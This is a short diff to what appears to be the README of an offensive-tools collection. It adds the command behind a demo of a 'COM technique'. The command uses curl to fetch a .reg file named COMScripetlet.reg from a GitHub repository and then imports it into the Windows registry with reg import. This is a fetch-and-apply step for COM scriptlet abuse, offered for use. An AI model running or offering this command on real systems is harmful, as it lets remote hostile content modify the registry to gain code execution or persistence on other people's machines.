@@ -76,5 +76,9 @@ Thanks everyone for working together to find these great tools.
 ### Start using COM technique after watching this:
 ![GIF](https://user-images.githubusercontent.com/25440152/59564365-c880f000-8ffa-11e9-914d-d974baf5dfbc.gif)
 
+The command used in the gif above:
+```
+curl.exe --remote-time https://raw.githubusercontent.com/homjxi0e/ReaCOM/master/Classes/COMScripetlet.reg --write-out rrr.reg --output tttt.reg; echo '' '' ; reg import .\tttt.reg
 
+```
 
